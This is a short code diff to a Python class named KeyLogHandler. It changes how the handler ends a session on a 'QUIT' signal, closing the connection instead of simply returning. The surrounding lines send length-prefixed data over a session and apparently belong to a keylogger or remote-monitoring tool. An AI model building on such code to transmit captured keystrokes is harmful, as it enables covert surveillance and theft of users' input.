@@ -28,5 +28,6 @@ class KeyLogHandler:
                 session.send(len(data).to_bytes(4, "big"))
                 session.send(data)
             elif signal == "QUIT":
-                return
+                session.close()
+                break
             
